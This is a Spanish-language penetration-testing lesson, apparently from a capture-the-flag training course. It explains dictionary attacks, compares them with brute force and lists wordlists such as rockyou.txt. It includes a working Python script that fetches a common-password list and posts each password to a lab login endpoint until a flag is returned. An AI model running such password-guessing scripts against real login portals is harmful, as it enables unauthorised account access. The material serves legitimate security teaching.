# Dictionary Attacks

Aunque el enfoque de fuerza bruta es exhaustivo, puede ser lento y consumir muchos recursos, especialmente cuando se trata de contraseñas complejas. Es aquí donde los dictionary attacks entran en juego.

## The Power of Words

La efectividad de un dictionary attack radica en su capacidad para explotar la tendencia humana de priorizar contraseñas memorables sobre seguras. A pesar de las advertencias, muchas personas siguen optando por contraseñas basadas en información fácilmente disponible, como palabras de diccionario, frases comunes, nombres o patrones predecibles. Esta previsibilidad las hace vulnerables a los dictionary attacks, donde los atacantes prueban sistemáticamente una lista predefinida de posibles contraseñas contra el sistema objetivo.

El éxito de un dictionary attack depende de la calidad y especificidad de la wordlist utilizada. Una wordlist bien diseñada, adaptada al público o sistema objetivo, puede aumentar significativamente la probabilidad de un acceso exitoso. Por ejemplo, si el objetivo es un sistema frecuentado por gamers, una wordlist enriquecida con terminología y jerga relacionada con videojuegos será más efectiva que un diccionario genérico. Cuanto más refleje la wordlist las posibles elecciones de contraseña del objetivo, mayores serán las probabilidades de éxito.

En esencia, el concepto de un dictionary attack está basado en comprender la psicología humana y las prácticas comunes de contraseñas. Al aprovechar este conocimiento, los atacantes pueden descifrar eficientemente contraseñas que, de otro modo, requerirían un ataque de fuerza bruta imprácticamente largo. En este contexto, el poder de las palabras reside en su capacidad para explotar la previsibilidad humana y comprometer medidas de seguridad que de otro modo serían robustas.

## Brute Force vs. Dictionary Attack

La distinción fundamental entre un brute-force y un dictionary attack radica en su metodología para generar posibles candidatos de contraseña:

- `Brute Force`: Un ataque de fuerza bruta prueba sistemáticamente _todas las combinaciones posibles_ de caracteres dentro de un conjunto y longitud predefinidos. Si bien este enfoque garantiza el éxito con suficiente tiempo, puede ser extremadamente lento, especialmente contra contraseñas largas o complejas.
- `Dictionary Attack`: En contraste, un dictionary attack utiliza una lista precompilada de palabras y frases, reduciendo drásticamente el espacio de búsqueda. Esta metodología dirigida resulta en un ataque mucho más eficiente y rápido, especialmente cuando se sospecha que la contraseña objetivo es una palabra o frase común.

|Feature|Dictionary Attack|Brute Force Attack|Explanation|
|---|---|---|---|
|`Efficiency`|Considerablemente más rápido y eficiente en recursos.|Puede ser extremadamente lento y consumir muchos recursos.|Los dictionary attacks aprovechan una lista predefinida, reduciendo significativamente el espacio de búsqueda en comparación con la fuerza bruta.|
|`Targeting`|Altamente adaptable y puede ser personalizada para objetivos específicos.|Sin capacidad inherente de enfoque.|Las wordlists pueden incorporar información relevante para el objetivo (e.g., nombre de empresa, nombres de empleados), aumentando la tasa de éxito.|
|`Effectiveness`|Excepcionalmente efectivo contra contraseñas débiles o comúnmente utilizadas.|Efectivo contra todas las contraseñas con tiempo y recursos suficientes.|Si la contraseña objetivo está en el diccionario, se descubrirá rápidamente. La fuerza bruta, aunque universalmente aplicable, puede ser impráctica para contraseñas complejas debido al volumen de combinaciones.|
|`Limitations`|Ineficaz contra contraseñas complejas, generadas aleatoriamente.|A menudo impráctico para contraseñas largas o altamente complejas.|Una contraseña verdaderamente aleatoria es poco probable que aparezca en cualquier diccionario, haciendo este ataque inútil. El número astronómico de combinaciones posibles para contraseñas largas puede hacer que los ataques de fuerza bruta sean inviables.|

Considera un escenario hipotético donde un atacante apunta al portal de inicio de sesión de empleados de una empresa. El atacante podría construir una wordlist especializada que incorpore lo siguiente:

- Contraseñas comúnmente usadas y débiles (e.g., "password123," "qwerty").
- El nombre de la empresa y sus variaciones.
- Nombres de empleados o departamentos.
- Jerga específica de la industria.

Al implementar esta wordlist personalizada en un dictionary attack, el atacante eleva significativamente la probabilidad de descifrar contraseñas de empleados en comparación con un intento de fuerza bruta puramente aleatorio.

## Building and Utilizing Wordlists

Las wordlists pueden obtenerse de diversas fuentes, incluyendo:

- `Publicly Available Lists`: Internet alberga una amplia gama de wordlists de acceso libre, que incluyen colecciones de contraseñas comúnmente utilizadas, credenciales filtradas de brechas de datos y otros datos potencialmente valiosos. Repositorios como [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Passwords) ofrecen diversas wordlists para diferentes escenarios de ataque.
- `Custom-Built Lists`: Los penetration testers pueden crear sus propias wordlists aprovechando información recopilada durante la fase de reconocimiento. Esto podría incluir detalles sobre los intereses del objetivo, pasatiempos, información personal u otros datos útiles para la creación de contraseñas.
- `Specialized Lists`: Las wordlists pueden refinarse aún más para atacar industrias, aplicaciones o incluso empresas específicas. Estas listas especializadas aumentan las probabilidades de éxito al enfocarse en contraseñas más propensas a ser utilizadas en un contexto particular.
- `Pre-existing Lists`: Algunas herramientas y frameworks vienen preempaquetados con wordlists comúnmente utilizadas. Por ejemplo, distribuciones de penetration testing como ParrotSec a menudo incluyen wordlists como `rockyou.txt`, una extensa colección de contraseñas filtradas, listas para su uso.

Aquí hay una tabla con algunas de las wordlists más útiles para brute-forcing de inicios de sesión:

|Wordlist|Description|Typical Use|Source|
|---|---|---|---|
|`rockyou.txt`|Una popular wordlist de contraseñas que contiene millones de contraseñas filtradas de la brecha de RockYou.|Comúnmente utilizada para ataques de fuerza bruta de contraseñas.|[RockYou breach dataset](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)|
|`top-usernames-shortlist.txt`|Una lista concisa de los nombres de usuario más comunes.|Adecuada para intentos rápidos de fuerza bruta de nombres de usuario.|[SecLists](https://github.com/danielmiessler/SecLists/tree/master)|
|`xato-net-10-million-usernames.txt`|Una lista más extensa de 10 millones de nombres de usuario.|Utilizada para ataques exhaustivos de fuerza bruta de nombres de usuario.|[SecLists](https://github.com/danielmiessler/SecLists/tree/master)|
|`2023-200_most_used_passwords.txt`|Una lista de las 200 contraseñas más comúnmente usadas en 2023.|Efectiva para atacar contraseñas comúnmente reutilizadas.|[SecLists](https://github.com/danielmiessler/SecLists/tree/master)|
|`Default-Credentials/default-passwords.txt`|Una lista de nombres de usuario y contraseñas predeterminadas comúnmente utilizadas en routers, software y otros dispositivos.|Ideal para probar credenciales predeterminadas.|[SecLists](https://github.com/danielmiessler/SecLists/tree/master)|

## Throwing a dictionary at the problem

**Para seguir este ejemplo, inicia el sistema objetivo desde la sección de preguntas al final de la página.**

La aplicación de instancia crea una ruta (`/dictionary`) que maneja solicitudes POST. Espera un parámetro `password` en los datos del formulario de la solicitud. Al recibir una solicitud, compara la contraseña enviada con el valor esperado. Si hay una coincidencia, responde con un objeto JSON que contiene un mensaje de éxito y la flag. De lo contrario, devuelve un mensaje de error con un código de estado 401 (Unauthorized).

Copia y pega este script de Python a continuación como `dictionary-solver.py` en tu máquina. Solo necesitas modificar las variables IP y port para que coincidan con la información del sistema objetivo.

```r
import requests

ip = "127.0.0.1"  # Change this to your instance IP address
port = 1234       # Change this to your instance port number

# Download a list of common passwords from the web and split it into lines
passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/500-worst-passwords.txt").text.splitlines()

# Try each password from the list
for password in passwords:
    print(f"Attempted password: {password}")

    # Send a POST request to the server with the password
    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})

    # Check if the server responds with success and contains the 'flag'
    if response.ok and 'flag' in response.json():
        print(f"Correct password found: {password}")
        print(f"Flag: {response.json()['flag']}")
        break
```

El script de Python orquesta el dictionary attack. Realiza los siguientes pasos:

1. `Descarga la Wordlist`: Primero, el script obtiene una wordlist de 500 contraseñas comúnmente usadas de SecLists utilizando la librería `requests`.
2. `Itera y Envía Contraseñas`: Luego, itera a través de cada contraseña en

la wordlist descargada. Por cada contraseña, envía una solicitud POST al endpoint `/dictionary` de la aplicación Flask, incluyendo la contraseña en los datos del formulario de la solicitud. 3. `Analiza las Respuestas`: El script verifica el código de estado de la respuesta después de cada solicitud. Si es 200 (OK), examina el contenido de la respuesta. Si la respuesta contiene la clave "flag", significa un inicio de sesión exitoso. El script imprime la contraseña descubierta y la flag capturada. 4. `Continúa o Termina`: Si la respuesta no indica éxito, el script procede a la siguiente contraseña en la wordlist. Este proceso continúa hasta encontrar la contraseña correcta o agotar toda la wordlist.

```r
python3 dictionary-solver.py

...
Attempted password: turtle
Attempted password: tiffany
Attempted password: golf
Attempted password: bear
Attempted password: tiger
Correct password found: ...
Flag: HTB{...}
```